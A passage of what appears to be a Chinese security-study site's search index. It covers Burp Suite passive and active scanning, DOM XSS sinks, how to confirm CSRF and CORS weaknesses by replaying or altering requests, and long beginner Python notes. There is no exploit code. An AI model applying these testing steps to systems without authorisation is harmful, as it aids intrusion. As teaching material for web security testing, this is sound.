当使用被动扫描模式时，Burp不会重新发送新的请求，它只是对已经存在的请求和应答进行分析，这对系统的检测比较安全，尤其在你授权访问的许可下进行的，通常适用于生产环境的检测。当某种业务场景的测试，每测试一次都会导致业务的某方面问题时，我们可以使用被动扫描模式，去分析问题是否存在，减少测试的风险。 提交的密码为未加密的明文。 不安全的Cookie的属性，比如缺少的HttpOnly和安全标志。 cookie的范围缺失。 跨域脚本包含和站点引用泄漏。 表单值自动填充，尤其是密码。 SSL保护的内容缓存。 目录列表。 提交密码后应答延迟。 session令牌的不安全传输。 敏感信息泄露，像内部IP地址，电子邮件地址，堆栈跟踪等信息泄漏。 不安全的ViewState的配置。 当使用主动扫描模式时，Burp会向应用发送新的请求并通过payload验证漏洞。这种模式下的操作，会产生大量的请求和应答数据，直接影响系统的性能，通常使用在非生产环境。它对下列的两类漏洞有很好的扫描效果：客户端的漏洞：XSS、Http头注入、操作重定向；服务端的漏洞：SQL注入、命令行注入、文件遍历。 对于第一类漏洞，Burp在检测时，会提交一下input域，然后根据应答的数据进行解析。在检测过程中，Burp会对基础的请求信息进行修改，即根据漏洞的特征对参数进行修改，模拟人的行为，以达到检测漏洞的目的。对于第二类漏洞，一般来说检测比较困难，因为是发生在服务器侧。比如说SQL注入，有可能是返回数据库错误提示信息，也有可能是什么也不反馈。Burp在检测过程中，采用各个技术来验证漏洞是否存在，比如诱导时间延迟、强制修改Boolean值，与模糊测试的结果进行比较，已达到高准确性的漏洞扫描报告。 测试Dom_XSS DOM：文档对象模型，是HTML和XML文档的编程接口。它允许脚本（js）控制Web页面、窗口和文档。简单来说，DOM就是一张映射表，记录着一堆用代码操控document时的规章制度，更直白点，就是js操作html时的API。 document.referer属性，window.name属性，location属性，innerHTML属性，documen.write属性等等这些都是可能出现漏洞的地方，而在安全挖掘时也该多多关注这些。 测试CSRF CSRF（Cross-site request forgery），中文名称：跨站请求伪造。简单来说，就是攻击者盗用了你的身份，以你的名义发送恶意请求。危害：修改密码，发送消息，购买商品，虚拟货币转账 防御： 验证HTTP Referer 字段 在请求地址中添加token并验证 在HTTP头中自定义属性并验证 验证： 重放请求====>无一次性token或验证码 referer去掉后重放请求====>无referer验证 去掉token后重放====>后端认证机制薄弱 测试CORS漏洞 CORS（跨域资源共享）： CORS的用途主要是为了跨域请求，读写资源，目前的主流浏览器都支持CORS CORS的漏洞，既然是用于跨域场景，自然少不了跨域中经常存在的一些安全问题，例如信息泄露等等，CORS的漏洞主要来源于服务端对于Origin的弱校验，从而导致黑客只要构造了一个CORS请求，就能跨域获取到信息。 但是如果跨域请求中允许携带cookie访问（Access-Control-Allow-Credentials:true），就不允许Origin被设置成Access-Control-Allow-Origin:*，这样的请求会被浏览器屏蔽。 特征： 请求中携带CORS特征：Origin:xxxxxxxx 响应中携带CORS特征： Access-Control-Allow-Origin:xxxxxxx Access-Control-Allow-Methods:POST，GET，OPTIONS Access-Control-Allow-Credentials:true 验证：修改请求中携带CORS特征：Origin:修改内容(可构造payload)，返回的响应Access-Control-Allow-Origin:修改内容，且Access-Control-Allow-Credentials:true，则表示存在CORS漏洞。 end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-05-07 23:21 "},"第二阶段-Web安全篇/Web安全攻防学习.html":{"url":"第二阶段-Web安全篇/Web安全攻防学习.html","title":"Web安全攻防学习","keywords":"","body":"Web安全攻防学习 第一章：信息收集 域名信息收集 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-05-07 11:30 "},"第六阶段-Python黑客编程/Python编程基础.html":{"url":"第六阶段-Python黑客编程/Python编程基础.html","title":"Python编程基础","keywords":"","body":"Python编程基础 Day1 编译型：一次性将所有程序编译成二进制文件。 缺点：开发效率低，不能跨平台。 优点：运行速度快。 C，C++等 解释型：当程序执行时，一行一行的解释。 优点：开发效率高，可以跨平台。 缺点：运行速度慢。 python，php等 变量命名规则：变量名可以包括字母、数字、下划线，但是数字不能做为开头。 Python2打印中文会出现报错，解决方法：首行添加代码：#-*- encoding:utf-8 -*- python中没有常量，约定俗成全大写为“常量” 单行注释：# 多行注释：'''注释内容''' 或 \"\"\"注释内容\"\"\" 不等于：!= 或 <> int（整型） 加减乘除取余+-/% 幂* 整除//（9//2 输出结果4，9.0//2.0输出结果4.0） 在32位机器上，整数的位数为32位，取值范围为-2^31 ~ 2^31-1，即-2147483648～2147483647 在64位系统上，整数的位数为64位，取值范围为-2^63 ～ 2^63-1，即-9223372036854775808～9223372036854775807 str（字符串） python当中凡是用引号引起来的都是字符串。 可相加：字符串的拼接。 可相乘：str * int（字符串的重复） bool（布尔值） True 、False type()可显示数据类型 input（用户交互） name = input('请输入您的名字：') input输入的内容类型均为str if、elif、else： if 条件 : 满足条件执行的内容 elif 条件: 满足上面的条件执行这个 elif 条件: 满足上面的条件执行这个 else: 上面所有的条件不满足执行这个 【python中\"满足条件执行的内容\"前为一个\"tab键\"或\"4个空格\"且要统一】 while： while 条件: 循环体 【python中\"循环体\"前为一个\"tab键\"或\"4个空格\"且要统一】 跳出循环： 改变条件 break：直接跳出循环体 continue：跳出本次循环，进入下次循环 优先级：() > not > and > or x or y 若x为True，则返回x 【and相反】 # print(1 or 2) # 1 # print(3 or 2) # 3 # print(0 or 2) # 2 # print(0 or 100) # 100 一个非零数字转换为布尔值为True，零转换为布尔值为False Ture转换为数字是1，False转换为数字是0 0、None、''、()、[]、{} ==> Flase str -----> bool：非空即为True 三元运算 a = 1 b = 5 c = a if a>b else b #三元运算 print(c) #输出5 Day2 格式化输出： 占位符：%s字符串占位符，%d整数占位符，%f浮点数占位符【若要在格式化输出中单纯输出%，需用%%表示】 name = input ('请输入您的姓名：') age = input ('请输入您的年龄：') height = input ('请输入您的身高：') msg = '''------------info of %s------------- Name : %s Age : %s Height : %s ----------------EDN----------------''' %(name,name,age,height) print (msg) format() s = '我叫{}，今年{}岁，爱好{}，昵称{}'.format('None',20,'女','None') print (s) s = '我叫{0}，今年{1}岁，爱好{2}，昵称{0}'.format('None',20,'女') print (s) name = input('请输入您的姓名：') s = '我叫{name}，今年{age}岁，爱好{hobby}，昵称{name}'.format(age = 20,name = name,hobby = '女') print (s) while-else 当while被break打断时，不执行else ASCII码 8位bit = 一个字节byte 最左边那位都为0，为预留位 1024 byte = 1 kb 万国码 unicode 一个字符用四个字节（32位）表示 Unicode 升级 utf-8 utf-8 一个字符最少用8位去表示 一个英文用一个字节（8位）表示 一个欧洲文字用两个字节（16位）表示 一个中文用三个字节（24 位）表示 gbk 国产，只能用于中文和ascii码中的文字。 一个中文用两个字节（16位）表示 Day3 .bit_length()输出整数的bit位数 i = 10 print (i.bit_length()) 字符串的索引与切片 s = 'ABCDEFG' #索引 s1 = s[0] #形成了一个新的字符串 s2 = s[1] print (s1) #输出A print (s2) #输出B s3 = s[-1] s4 = s[-2] print (s3) #输出G print (s4) #输出F #切片：顾头不顾尾 s5 = s[0:4] print (s5) #输出ABCD s6 = s[0:-1] print (s6) #输出ABCDEF s7 = s[0:] print (s7) #输出ABCDEFG s8 = s[:] print (s8) #输出ABCDEFG #[首:尾:步长] s9 = s[0:5:2] #隔一个取一个 print (s9) #输出ACE s10 = s[0:7:3] #隔两个取一个 print (s10) #输出ADG s11 = s[4:0:-1] print (s11) #输出EDCB s12 = s[3::-1] print (s12) #输出DCBA s13 = s[3::-2] print (s13) #输出DB s14 = s[::-1] print (s14) #输出GFEDCBA 字符串的操作 s = 'nOnE' s1 = s.capitalize() #首字母大写 print (s1) #输出None s2 = s.upper() #全部大写 print (s2) #输出NONE s3 = s.lower() #全部小写 print (s3) #输出none s4 = s.swapcase() #大小写翻转 print (s4) #输出NoNe #每个隔开的(特殊字符或数字)单词首字母大写 a = 'none*is_admin' s5 = a.title() print (s5) #输出None*Is_Admin s6 = s2.center(10) #居中，10个位置 print (s6) #输出 NONE s7 = s2.center(10,'-') #居中，用-填充 print (s7) #输出---NONE--- #若字符串里出现\\t则补满前面8位/16位 b = 'abcd\\tefgh' s8 = b.expandtabs() print (s8) #输出abcd efgh c = '我是None' l = len(c) #计算字符串长度 print (l) #输出6 #判断以什么开头、结尾【str切片】 s9 = a.startswith('no') #判断是否以no开头 print (s9) #输出True s10 = a.startswith('*',4) #判断第5位是否以*开头 print (s10) #输出True s11 = a.endswith('admin') #判断是否以admin结尾 print (s11) #输出True #通过元素找索引，找不到返回-1 s12 = a.find('admin') #找admin print (s12) #输出8 #通过元素找索引，找不到则报错 s13 = a.index('admin') #找admin print (s13) #输出8 #删除机制：首尾同时进行元素检索删除，直到遇到非检索元素 #strip左右都删，rstrip删右，lstrip删左 s14 = s6.strip() #默认删除前后的空格 print (s14) #输出NONE s15 = s7.strip('-') #删除前后的- print (s15) #输出NONE d = '*none-none-' s16 = d.strip('-*') #删除前后的-和* print (s16) #输出none-none s17 = d.rstrip('-*') #删除右边的-和* print (s17) #输出*none-none s18 = d.count('n') #统计字符串中n的个数 print (s18) #输出4 s19 = d.count('no') #统计字符串中no的个数 print (s19) #输出2 s20 = d.count('n',0,4) #统计字符串0-4中n的个数 print (s20) #输出2 #str ======> list s21 = d.split('-') #以-分割，默认不写是空格 print (s21) #输出['*none', 'none', ''] s21 = d.split('-',1) #以-分割一次 print (s21) #输出['*none', 'none-'] s22 = d.replace('none','None')#替换，默认全部替换 print (s22) #输出*None-None- s23 = d.replace('none','None',1)#只替换第一个 print (s23) #输出*None-none- #is系列 print (d.isalnum()) #判断字符串是否由字母或数字组成 print (d.isalpha()) #判断字符串是否由字母组成 print (d.isdigit()) #判断字符串是否由数字组成 #for-in for i in d: print(i) #遍历输出字符串的元素 #if-in if 'none' in d: print ('你好，None！') #判断字符串中是否含有某些字符 Day4 元组tupe() 元组：俗称不可变的列表,又被成为只读列表，元祖也是python的基本数据类型之一，用小括号括起来，里面可以放任何数据类型的数据，查询可以，循环也可以，切片也可以，但就是不能改。例：（1，2，3）（\"a\"，\"b\"，\"c\"） 列表list[] 列表是python的基础数据类型之一 ,其他编程语言也有类似的数据类型。比如JS中的数组， java中的数组等等.。它是以[ ]括起来，每个元素用' , '隔开而且可以存放各种数据类型：列表是python中的基础数据类型之一，其他语言中也有类似于列表的数据类型，比如js中叫数组，他是以[]括起来，每个元素以逗号隔开，而且他里面可以存放各种数据类型比如：li = ['alex',123,Ture,(1,2,3,'wusir'),[1,2,3,'小明'],{'name':'alex'}] 列表相比于字符串，不仅可以储存不同的数据类型，而且可以储存大量数据，32位python的限制是 536870912 个元素,64位python的限制是 1152921504606846975 个元素。而且列表是有序的，有索引值，可切片，方便取值。 增删查改 #增 l = [0,1,'overwatch','none',[2,3]] print(l[2]) #输出overwatch print(l[4]) #输出[2, 3] l.append('admin') print(l) #输出[0, 1, 'overwatch', 'none', [2, 3], 'admin'] l.insert(3,'player') print(l) #输出[0, 1, 'overwatch', 'player', 'none', [2, 3], 'admin'] l.extend('DG') #extend迭代处理增添元素 print(l) #输出[0, 1, 'overwatch', 'player', 'none', [2, 3], 'admin', 'D', 'G'] l.extend([4,5,6]) print(l) #输出[0, 1, 'overwatch', 'player', 'none', [2, 3], 'admin', 'D', 'G', 4, 5, 6] #删 l = [0,1,'overwatch','none',[2,3]] delete = l.pop(2) print(l) #输出[0, 1, 'none', [2, 3]] print(delete) #输出overwatch【pop有返回值】 l.pop() #默认删最后一个 print(l) #输出[0, 1, 'none'] del l[0:2] #删除前两个元素 print(l) #输出['none'] l.clear() #清空列表 print(l) #输出[] #查 l = [0,1,'overwatch','none',[2,3]] print(l[2]) #切片查找overwatch for i in l: #迭代查找 print(i) #0 #1 #overwatch #none #[2,3] l = [0,1,'overwatch','none',[2,3]] print(l[2][1]) #输出v #改 l = [0,1,'overwatch','none',[2,3]] l[3] = l[3].upper() #改变第4个元素 print(l) #输出[0, 1, 'overwatch', 'NONE', [2, 3]] l[0:2] = 'win' #迭代处理改动元素 print(l) #输出['w', 'i', 'n', 'overwatch', 'NONE', [2, 3]] l[0:3] = [1,2,'win'] #迭代处理改动元素 print(l) #输出[1, 2, 'win', 'overwatch', 'NONE', [2, 3]] #其他 l = [0,1,'overwatch','none',[2,3]] print(len(l)) #输出5 print(l.count('none'))#对none计数，输出1 print(l.index('none'))#查找none的索引【列表无find】，输出3 #排序 l = [6,4,2,3,8,9,1] l.reverse() #翻转 print(l) #输出[1, 9, 8, 3, 2, 4, 6] l.sort() #正向排序 print(l) #输出[1, 2, 3, 4, 6, 8, 9] l.sort(reverse=True) #反向排序 print(l) #输出[9, 8, 6, 4, 3, 2, 1] #元组【元组的元素只读，元组里的列表可动】 y = (0,1,'none',3,[4,5,'overwatch']) y[4][2] = y[4][2].upper() print(y) #输出(0, 1, 'none', 3, [4, 5, 'OVERWATCH']) y[4][1] = 'nice' print(y) #输出(0, 1, 'none', 3, [4, 'nice', 'OVERWATCH']) del y[4][2] print(y) #输出(0, 1, 'none', 3, [4, 'nice']) y[4].append('OK') print(y) #输出(0, 1, 'none', 3, [4, 'nice', 'OK']) s = 'none' s1 = '-'.join(s) #join()里为可迭代对象，如字符串列表元组 print(s1) #输出n-o-n-e #str 转为 list 用 split #list 转为 str 用 join l = ['none','is','admin'] s2 = ' '.join(l) print(s2) #输出none is admin #range(n,m)相当于[n,.....,m-1]且n Day5 数据类型划分：可变数据类型，不可变数据类型 不可变数据类型：元组、bool、int、str 可哈希 可变数据类型：list、dict、set 不可哈希 dict、key：必须是不可变数据类型，可哈希；value：任意数据类型。 字典dict{} 字典的每个键值 key=>value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中。 dict 优点： 二分查找去查询 存储大量的关系型数据 字典是python中唯一的映射类型，采用键值对（key-value）的形式存储数据。python对key进行哈希函数运算，根据计算的结果决定value的存储地址，所以字典是无序存储的，且key必须是可哈希的，可哈希表示key必须是不可变类型，如：数字、字符串、元组。 字典（dictionary）是除列表以外python之中最灵活的内置数据结构类型。列表是有序的对象运合，字典是无序的对象集合。两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。 a = 1 b = 2 print(a,b) #1 2 a,b = b,a #一行代码实现交换 print(a,b) #2 1 #字典 dic = { 'name':'none', 'age':20, 'sex':'male', } #增 dic['hobby'] = 'game' #有键值对则覆盖，没有则添加 print(dic) #{'name': 'none', 'age': 20, 'sex': 'male', 'hobby': 'game'} dic.setdefault('hight',175) #有键值对则不做改变，没有则添加 print(dic) #{'name': 'none', 'age': 20, 'sex': 'male', 'hobby': 'game', 'hight': 175} dic.setdefault('name','admin') print(dic) #{'name': 'none', 'age': 20, 'sex': 'male', 'hobby': 'game', 'hight': 175} #删 dic.pop('hight') #有返回值 #print(dic.pop('hight')) #输出175 print(dic) #{'name': 'none', 'age': 20, 'sex': 'male', 'hobby': 'game'} print(dic.pop('asd',None)) #若没有要删的键则报错，可在\",\"后添加返回值则不报错 dic.popitem() #py3.5前随机删除，py3.6后删除最后一个 print(dic) #{'name': 'none', 'age': 20, 'sex': 'male'} del dic['name'] print(dic) #{'age': 20, 'sex': 'male'} dic.clear() #清空字典 del dic #删除字典 #查 dic = {'name':'none','age':20,'sex':'male',} print(dic['age']) #输出20，若没有该键则会报错 print(dic.get('name1')) #输出None，因为没有该键所以返回None，不报错 print(dic.get('name1','没有该值'))#输出：没有该值 print(dic.keys(),type(dic.keys()))#输出dict_keys(['name', 'age', 'sex']) print(dic.values()) #输出dict_values(['none', 20, 'male']) print(dic.items()) #输出dict_items([('name', 'none'), ('age', 20), ('sex', 'male')]) for i in dic: print(i) #逐行输出键name//age//sex for i in dic.values(): print(i) #逐行输出值none//20//male for i in dic.items(): print(i) #逐行输出键值对('name', 'none')//('age', 20)//('sex', 'male') for k,v in dic.items(): print(k,v) #逐行输出name none//age 20//sex male #改 dic = {'name':'none','age':20,'sex':'male',} dic['name'] = 'admin' ##有键值对则覆盖，没有则添加 print(dic) #{'name': 'admin', 'age': 20, 'sex': 'male'} dic1 = {'name':'none','hobby':'game',} dic.update(dic1) #将dic1添加到dic里，有则覆盖，没有则添加 print(dic) #{'name': 'none', 'age': 20, 'sex': 'male', 'hobby': 'game'} #字典的嵌套 dic = { 'name':['none','admin','asuna'], 'mike':{ 'age':20, 'hobby':'game' }, 'country':'China' } dic['country'] = 'CN' dic['name'].append('alice') print(dic['name']) #输出['none', 'admin', 'asuna', 'alice'] dic['name'][2] = dic['name'][2].capitalize() print(dic['name']) #输出['none', 'admin', 'Asuna', 'alice'] dic['mike']['country'] = 'USA' print(dic['mike']) #输出{'age': 20, 'hobby': 'game', 'country': 'USA'} dic['name'].insert(0,'asd') print(dic['name']) #输出['asd', 'none', 'admin', 'Asuna', 'alice'] #判断字符串中的整数个数 str = input('>>>') for i in str: #对字符串的内容进行逐个检查 if not i.isdigit(): #判断内容是否为数字 str = str.replace(i,' ')#若元素不为数字则替换为空格 l = str.split() #将字符串转换为列表 print(len(l)) #统计列表的元素格个数并输出 Day6 ascii A : 00000010 8位 一个字节 unicode A ：00000000 00000001 00000010 00000100 32位 四个字节 中：00000000 00000001 00000010 00000110 32位 四个字节 utf-8 A ：00100000 8位 一个字节 中：00000001 00000010 00000110 24位 三个字节 gbk A ：00000110 8位 一个字节 中：00000010 00000110 16位 两个字节 各个编码之间的二进制，是不能互相识别的，会产生乱码。 文件的储存，传输，不能是unicode（只能是utf-8 utf-16 gbk,gb2312,asciid等） py3中str在内存中是以Unicode编码。传输和储存是以bytes类型。 bytes类型 对于英文： str ： 表现形式：s = 'asuna' 编码方式： 01010101 unicode bytes ： 表现形式：s = b'asuna' 编码方式： 01010101 utf-8、gbk。。。。 对于中文： str ： 表现形式：s = '亚丝娜' 编码方式： 01010101 unicode bytes ： 表现形式：s = b'\\xd1\\xc7\\xcb\\xbf\\xc4\\xc8' 编码方式： 01010101 utf-8、gbk。。。。 # = 赋值，== 判断值是否相等，is 判断内存地址是否相等 li = [1,2,3] li1 = li print(li is li1) #输出True print(id(li),id(li1))#输出17038760 17038760 #数字，字符串 存在小数据池 #数字：-5 ~ 256 #字符串：不能含有特殊字符，等 n = 6 n1 = 6 print(n is n1) #输出True #编码 #str -----> bytes s = 'asuna' s1 = s.encode('utf-8') print(s1) #输出b'asuna' s = '亚丝娜' s1 = s.encode('gbk') print(s1) #输出b'\\xd1\\xc7\\xcb\\xbf\\xc4\\xc8' Day7 字典{}与集合({}) #0 '' [] () {} ------> False，其他的为True #元组里面只有一个元素，且没有逗号，该元素是什么类型就什么类型 tu1 = (1) tu2 = (1,) print(tu1,type(tu1)) #输出1 print(tu2,type(tu2)) #输出(1,) tu3 = ([1]) tu4 = ([1],) print(tu3,type(tu3)) #输出[1] print(tu4,type(tu4)) #输出([1],) #要求：删除字典中“键”中含有“k”的键值对 #在循环的字典中删除键值对会报错 # dic = {'k1':'v1','k2':'v2','a3':'v3'} # for i in dic: # if 'k' in i: # del dic[i] #法1 dic = {'k1':'v1','k2':'v2','a3':'v3'} dic1 = {} for i in dic: if 'k' not in i: dic1.setdefault(i,dic[i]) dic = dic1 print(dic) #输出{'a3': 'v3'} #法2 dic = {'k1':'v1','k2':'v2','a3':'v3'} l = [] for i in dic: if 'k' in i: l.append(i) for i in l: del dic[i] print(dic) #输出{'a3': 'v3'} #集合set({})：可变的数据类型，但里面的元素必须是不可变数据类型，无序，不重复 set1 = set({1,2,3}) print(set1) #输出{1, 2, 3} #增 set2 = set({'asd',1,'none','none','asuna'}) set2.add('3') print(set2) #输出{1, 'none', '3', 'asuna', 'asd'} 无序不重复 set2.update('abc') print(set2) #输出{1, 'asuna', 'c', 'asd', 'a', '3', 'b', 'none'} #删 set2.pop() #随机删除，有返回值 print(set2,set2.pop()) #输出{'c', 'asd', 'a', '3', 'b', 'none'} asuna set2.remove('c') print(set2) #输出{'asd', 'a', '3', 'b', 'none'} set2.clear() print(set2) #输出set() #查 set2 = set({'asd',1,'none','none','asuna'}) for i in set2: print(i) #输出none//1//asuna//asd #交集 set1 = ({4,5,3,2,1}) set2 = ({1,3,5,6,2}) print(set1 & set2) #输出{1, 2, 3, 5} print(set1.intersection(set2)) #输出{1, 2, 3, 5} #并集 print(set1 | set2) #输出{1, 2, 3, 4, 5, 6} print(set1.union(set2)) #输出{1, 2, 3, 4, 5, 6} #反交集 print(set1 ^ set2) #输出{4, 6} print(set1.symmetric_difference(set2)) #输出{4, 6} #差集 print(set1 - set2) #输出{4} print(set1.difference(set2)) #输出{4} #子集 set1 = ({3,2,1}) set2 = ({1,3,5,6,2}) print(set1 set1) #输出True print(set2.issuperset(set2)) #输出True #去重 li = [1,22,22,33,'none','none'] li = list(set(li)) print(li) #输出[1, 'none', 22, 33] #冻结 -----> 不可变 set4 = set({'none','asuna',123}) print(set4,type(set4)) #输出{123, 'none', 'asuna'} set4 = frozenset(set4) print(set4,type(set4)) #输出frozenset({123, 'none', 'asuna'}) Day8 文件处理 文件处理：内存 ↔ 硬盘 文件路径 操作方式：只读，只写，追加，读写，写读...... 编码方式：utf-8，gbk...... 读：mode = 'r' f = open('E:\\test.txt',mode = 'r',encoding = 'utf-8') content = f.read() print(content) #输出0DAY计划 f.close() 非文字类文件、上传下载：mode = 'rb' f = open('E:\\test.txt',mode = 'rb') content = f.read() print(content) #输出b'0DAY\\xe8\\xae\\xa1\\xe5\\x88\\x92' f.close() 写：mode = 'w' f = open('hack',mode = 'w',encoding = 'utf-8') #没有此文件则创建，有则覆盖 f.write('hack the world') f.close() 写：mode = 'wb' f = open('hack',mode = 'wb') f.write('hack the world!'.encode('utf-8')) #str转换为bytes类型 f.close() 追加：mode = 'a' f = open('hack',mode = 'a',encoding = 'utf-8') f.write('hack the world!') f.close() 读写：mode = 'r+' 若先写后读，则会在文件开头进行写入，读取写入内容后面剩余的内容；读写后再读，无效，只能读取一次】 f = open('hack',mode = 'r+',encoding = 'utf-8') print(f.read()) f.write('by None') f.close() 读写：mode = 'r+b' f = open('hack',mode = 'r+b') print(f.read()) f.write('一叶知秋'.encode('utf-8')) f.close() 写读：mode = 'w+' 如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。 f = open('hack',mode = 'w+',encoding = 'utf-8') f.write('by 一叶知秋') print(f.read()) #输出为空白 f.close() f = open('hack',mode = 'w+',encoding = 'utf-8') f.write('by 一叶知秋') f.seek(0) #将文件指针移至开头 print(f.read()) #输出by 一叶知秋 f.close() 追加写读：mode = 'a+' f = open('hack',mode = 'a+',encoding = 'utf-8') f.write('by 一叶知秋') f.seek(0) #将文件指针移至开头 print(f.read()) #输出by 一叶知秋by 一叶知秋 f.close() read()【一次性读取】 f = open('hack',mode = 'r+',encoding = 'utf-8') content = f.read(5) #单位为字符 print(content) #输出by 一叶 f.close seek()【使文件指针移动到指定位置】 f = open('hack',mode = 'r+',encoding = 'utf-8') f.seek(6) #单位为字节,若改为seek(4)则会报错，一个中文占3个字节 content = f.read() print(content) #输出叶知秋by 一叶知秋 f.close tell()【获取文件指针当前的位置】 f = open('hack',mode = 'a+',encoding = 'utf-8') print(f.tell()) #输出30 f.write('hello world') f.seek(f.tell() - 11) print(f.read()) #输出hello world f.close readline() #一行一行的读取 readlines() #每一行当成列表中的一个元素，添加到列表中【一次性读取】 f = open('hack',mode = 'r+',encoding = 'utf-8') #print(f.readline()) #输出by 一叶知秋by 一叶知秋 print(f.readlines()) #输出['by 一叶知秋by 一叶知秋\\n', 'hello world'] f.close() 显示文件内容【警告：注意读取文件的大小，忌全部读取】 f = open('hack',mode = 'r+',encoding = 'utf-8') for i in f: print(i) f.close() ''' 输出为： by 一叶知秋by 一叶知秋 hello world ''' truncate()【截取文件】 f = open('hack',mode = 'r+',encoding = 'utf-8') f.truncate(15) #截存前15个字节的内容 print(f.readlines()) #输出['by 一叶知秋'] f.close() 非close()写法，自动关闭 with open('hack',mode = 'r+',encoding = 'utf-8') as f: print(f.read()) #输出by 一叶知秋 with open('hack',mode = 'r+',encoding = 'utf-8') as f,open('hack',mode = 'a+',encoding = 'utf-8') as f1: print(f.read()) #输出by 一叶知秋 f1.write('\\nhello world') f1.seek(0) print(f1.readlines()) #输出['by 一叶知秋\\n', 'hello world'] 修改文件 with open('hack',mode = 'r',encoding = 'utf-8') as f,open('hack.bak',mode = 'w',encoding = 'utf-8') as f1: for line in f: if '一叶知秋' in line: line = line.replace('一叶知秋','None') #修改文件内容 f1.write(line) #写文件 import os os.remove('hack') #删除原文件 os.rename('hack.bak','hcak') #重命名新文件 登录注册 lis = [] i = 3 username = input('请输入注册用户名：') password = input('请输入初始密码：') with open('info',mode = 'w',encoding = 'utf-8') as f: f.write('{}\\n{}'.format(username,password)) print('注册成功！') while i > 0: i-=1 uname = input('请输入你的用户名：') passwd = input('请输入你的密码：') with open('info',mode = 'r',encoding = 'utf-8') as f1: for line in f1: lis.append(line) if uname == lis[0].strip() and passwd == lis[1].strip(): print('登录成功！') break else: print('账号或密码错误！剩余{}次机会！'.format(i)) Day9 函数 关于参数 没有参数：定义函数和调用函数时括号里都为空 一个参数：传什么就是什么 多个参数：【顺序：位置参数，args，默认参数，*kwargs】 关于传参 按照位置传参：必须传，有几个形参就得传几个实参 按照关键字传参：可不传，即使用默认参数 可以混用，但必须是先位置传参再关键字传参（同一个变量仅可传递一个参数） 关于返回值 函数中执行了retune后，则该函数后面的内容都不执行 当函数有多个返回值，若只用一个变量接收，得到的是一个元组 函数名：地址；函数名+括号：执行 默认参数的陷阱：如果默认参数的值是一个可变数据类型，且使用默认参数，那么每一次调用函数时，都是公用这个数据类型的资源 动态参数：用于传递任意个参数，【接受聚合，调用打散】 动态参数*args： 默认命名为args 接收的是按照位置传参的值，组成一个元组 def sum(*args): n = 0 for i in args: n += i return n print(sum(1,2,3,4)) #输出10 动态参数**kwargs： 默认命名为kwargs 接收的是按照关键字传参的值，组成一个字典 def sum(**kwargs): print(kwargs) print(sum(a = 'aaa',b = 'bbb')) #{'a': 'aaa', 'b': 'bbb'} 动态参数的另一种传参方式 在传参时，在实参前面加上*，即对这个实参逐个传参 def func(*args): print(args) l = [1,2,3] func(*l) #输出(1, 2, 3) def fun(**kwargs): print(kwargs) d = {'a': 1,'b' : 2} fun(**d) #输出{'a': 1, 'b': 2} 函数的注释 def func(): ''' 这个函数实现的功能 参数1： 参数2： return： ''' pass print(func.__doc__) #打印该函数的注释 Day10 命名空间 内置命名空间 —— Python解释器 print()、input()、len() 就是Python解释器一启动就可以使用的函数存储在内置命名空间中 启动解释器时就被加载进内存 全局命名空间 —— 自定义变量 在程序从上到下被执行的过程中依次加载进内存 局部命名空间 —— 函数 函数内部定义的变量 当调用函数时才会产生命名空间，随着函数执行的结束而消失 多个局部命名空间是相互独立的 依赖关系：局部命名空间（全局命名空间（内置命名空间））），底层空间可被高层空间调用，但不能反向调用 当我们的全局定义和内置命名空间中存在同名时，会使用全局定义的命名空间，即调用查找顺序为局部→全局→内置 作用域 全局作用域 内置和全局命名空间 可用globals()进行查看，globals()永远显示的是全局的命名空间 局部作用域 局部命名空间 可用locals()进行查看，locals()显示的命名空间和其被放置的位置有关 global 若想在函数内部对函数外的变量进行操作，就需要在函数内部声明其为global。 如果一个变量进行了global声明，那么这个变量在局部的操作将影响全局。 global为不安全代码，应用传参进行操作 a = 1 def func(): global a a += 1 func() print(a) 闭包 闭包 嵌套函数，内部函数调用外部函数的变量 使用.__closure__可查看是否为闭包函数 可以减少反复调用时开辟和关闭内存消耗的时间 def outer(): a = 1 def inner(): print(a) print(inner.__closure__) #输出(,) outer() print(outer.__closure__) #输出None 闭包的常用方法：在函数外部使用函数内部的变量 def outer(): a = 1 #由于后面会调用该变量，所以不会随函数的结束而消失 def inner(): print(a) return inner #返回了inner函数的地址 inn = outer() #全局变量指向了一个内部函数 inn() #输出1 Day11 装饰器 作用：在不修改函数的调用方式的前提下，在原来的函数上添加功能 原则：开放封闭原则：对扩展的开放的，对修改是封闭的（用于维护代码的稳定性） 本质：闭包函数 import time def func(): time.sleep(0.01) print('Hello World!') def wrapper(f): #装饰器函数 def inner(): start = time.time() f() #被装饰的函数 end = time.time() print(end - start) return inner func = wrapper(func) #将被装饰函数传入装饰函数 func() #实际上运行的是inner() 语法糖 以上代码可用语法糖来进行简化 import time def wrapper(f): #装饰器函数 def inner(): start = time.time() f() #被装饰的函数 end = time.time() print(end - start) return inner @wrapper #语法糖 @装饰器函数 def func(): #被装饰的函数 time.sleep(0.01) print('Hello World!') func() 装饰带返回值的函数 import time def wrapper(f): #装饰器函数 def inner(): start = time.time() ret = f() #记录被装饰的函数的返回值 end = time.time() print(end - start) return ret #返回被装饰函数的返回值 return inner @wrapper #语法糖 def func(): time.sleep(0.01) print('Hello World!') return 'by 一叶知秋' ret = func() print(ret) 装饰带参数的函数 import time def wrapper(f): #装饰器函数 def inner(a): #带上形参 start = time.time() ret = f(a) #被装饰的函数 end = time.time() print(end - start) return ret return inner @wrapper #语法糖 def func(a): time.sleep(0.01) print('Hello World!',a) return 'by 一叶知秋' ret = func(1) print(ret) 装饰带多个参数的函数 import time def wrapper(f): #装饰器函数 def inner(*args,**kwargs): #带上形参，动态参数：接受聚合，(1,2) start = time.time() ret = f(*args,**kwargs) #被装饰的函数，动态参数：调用打散，*(1,2) end = time.time() print(end - start) return ret return inner @wrapper #语法糖 def func(a,b): time.sleep(0.01) print('Hello World!',a,b) return 'by 一叶知秋' ret = func(1,2) ret = func(1,b=2) print(ret) 装饰器的固定格式 def wrapper(f): #装饰器函数,f是被装饰的函数 def inner(*args,**kwargs): ''' 在被装饰函数之前要做的事 ''' ret = f(*args,**kwargs) #被装饰的函数 ''' 在被装饰函数之后要做的事 ''' return ret return inner @wrapper #语法糖 def func(a,b): #被装饰的函数 pass Day12 带参数的装饰器 from 